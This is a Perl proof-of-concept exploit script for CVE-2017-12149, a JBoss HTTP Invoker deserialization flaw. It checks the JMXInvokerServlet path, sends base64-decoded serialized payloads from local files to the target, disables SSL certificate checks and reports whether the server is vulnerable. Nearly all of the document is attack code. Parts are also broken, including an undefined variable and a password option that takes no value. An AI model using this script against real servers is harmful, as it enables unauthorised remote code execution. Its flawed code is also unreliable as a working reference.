#!/usr/bin/perl
# Server: Apache-Coyote/1.1
# WWW-Authenticate: Basic realm="JBoss HTTP Invoker"

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

BEGIN {
    my $error = 0;
    my @modules = ("MIME::Base64", "Data::Dump", "Getopt::Long", "LWP::UserAgent", "HTTP::Request", "HTTP::Response", "HTTP::Cookies", "IO::Socket::SSL");
    
    foreach my $module (@modules) {
        eval "use $module";
        if($@) {
            print "[-] Perl Module [$module] Not Found\n";
            print "\n\t-> Please Install It By Running The Following Command :\n\t cpan -i $module\n";
            $error = 1;
        }
    }
    die() if($error);
    
    use Data::Dump qw(dump);
    
    # Remove SSL Certs Validity Checks
    
    $ENV{'PERL_LWP_SSL_VERIFY_HOSTNAME'} = 0;
    
    $ENV{HTTPS_DEBUG} = 1;
    
    IO::Socket::SSL::set_ctx_defaults(
        SSL_verifycn_scheme => 'www',
        SSL_verify_mode => 0,
    );
    
};

# Global Variables
my $host = "127.0.0.1";
my $port = 9080;
my $scheme = "http";
my $path = "/";
my $username = "admin";
my $password = "admin";
my $url = 0;
my $debug = 0;
my $payload = "payloads/version.b64";
my $b64_credentials = 0;

# Get Options/arguments
GetOptions(
    "host=s"          => \$host,
    "port=i"          => \$port,
    "username=s"      => \$username,
    "password"        => \$password,
    "scheme=s"        => \$scheme,
    "path=s"          => \$path,
    "payload=s"       => \$payload,
    "--debug!"        => \$debug,
) or help();

# Display The Header
header();

$url = $scheme . '://' . $host . ':' . $port . $path;
$b64_credentials = encode("$username:$password");

# Run The PoC
exploit($url);


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-12149 ]=================================";
    
    print qq{
        $title
        
        Reporter :
        Date :
        CVE : CVE-2017-12149
        
        Description :
        
        
        In Jboss Application Server as shipped with Red Hat Enterprise
        Application Platform 5.2, it was found that the doFilter method in the
        ReadOnlyAccessFilter of the HTTP Invoker does not restrict classes for
        which it performs deserialization and thus allowing an attacker to
        execute arbitrary code via crafted serialized data.
        
        
    };
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        
        # Usage :
        
        perl $0 --host <HOST> --port <PORT> [OPTIONS]
        
        # Options :
        
        --host           : Server Hostname / IP [Default: $host]
        --port           : Port To Use For The HTTP Virtual Host [Default: $port](Shouldn't Be Already Used)
        --username       : HTTP Authentification Username [Default: $username]
        --pasword        : HTTP Authentification Password [Default: $password]
        --payload        : Malicious Payload File To Send [Default: $payload]
        --scheme         : URL Scheme [Default: $scheme]
        --path           : JBoss Installation Path [Default: $path]
        
        # Exemple :
        
        perl $0 --host $host --port $port --username $username --passowrd $password
        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    $request->header("Accept" => "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2");
    $request->header("Connection" => "keep-alive");
    $request->header("User-Agent" => "Java/1.6.0_06");
    $request->header("Content-Type" => "application/octet-stream");
    $request->header("Accept-Encoding" => "x-gzip,x-deflate,gzip,deflate");
    $request->header("ContentType" => "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation");
    $request->header("Authorization" => "Basic $b64_credentials") if($b64_credentials);
    
    return $request;
}

sub exploit {
    my ( $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $exploit_path = '/invoker/readonly/JMXInvokerServlet/';
    my $versio_payload = 'payloads/version.b64';
    my $proxy = 0;
    my $vulnerable = 1;
    my $timeout = 30;
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Build/send the requests
    if(-f $payload && -f $versio_payload) {
        print "[*] Checking Exploit Path's Existence ..\n";
        $request = buildRequest($url . $exploit, "GET", "", "application/octet-stream");
        $response = $browser->request($request);
        if($response->code =~ /200/) {
            print "[+] Exploit Path Is Available.\n";
        } elsif($response->code =~ /401/) {
            print "[!] The Credentials Provided May Be Wrong.\n";
        } else {
            print "[-] Unexpected Response From The Server : " . $response->code;
        }
        
        print "[*] Trying To Raise An Exception On : $exploit_path\n";
        $request = buildRequest($url . $exploit, "POST", decode_base64(join("", read_file($versio_payload,1))), "application/octet-stream");
        $response = $browser->request($request);
        if($response->content =~ /ServletException/i) {
            print "[+] Servlet Excepton Raised Successfully.\n";
        } else {
            print "[-] Any Exception Raised, Target Doesn't Seems To Be Vulnerable.\n";
        }
        
        $payload = join("", read_file($payload, 1));
        print "[*] Sending Injection Using User : admin On : $path\n";
        print "\t=> Authorization : $b64_credentials\n\t=> Base64 Payload : $payload\n" if($debug);
        $request = buildRequest($url . $exploit_path, "POST", decode_base64($payload), "application/octet-stream");
        $response = $browser->request($request);
        
        if($debug) {
            print dump($request) . "\n" . '-'x80 . "\n" . dump($response) . "\n\n";
        } else {
            print "\t => " . $request->uri . " (" . $response->code . ")\n\n";
        }
        
        $vulnerable = 0 if(!validate("TCODE", "200", $response));
        
        # Request : EXPLOIT1
        print "[*] Sending Detection Request To Check Affected Directory Existences : $path\n";
        $request = buildRequest($url . $exploit_path, "POST", "", "application/octet-stream");
        $response = $browser->request($request);
        print "\t => " . $request->uri . " (" . $response->code . ")\n\n";
        
        $vulnerable = 0 if(!validate("TCODE", "401", $response));
        
        
        ### Validate or not the test
        if($vulnerable) {
            print "[VULNERABLE] $url is affected or any kind of validation was provided.\n";
        } else {
            print "[NOT VULNERABLE] $url is not affected.\n";
        }
    } else {
        print "[-] Error : Couldn't Read Payload File : $payload\n";
    }
}

sub encode {
    my ( $string ) = @_;
    my $string_encoded = 0;
    
    $string_encoded = encode_base64($string);
    chomp $string_encoded;
    
    return $string_encoded;
}

sub read_file {
    my ($file, $chomp) = @_;
    $chomp = 0 if(!defined($chomp));
    
    my @final_content = ();
    
    open FILE, $file or die Error("$file Couldn't Be Read  .");
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
    } else {
        @final_content = @content;   
    }
    
    return @final_content;
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        return $positive;
    }
    
    return 0;
}
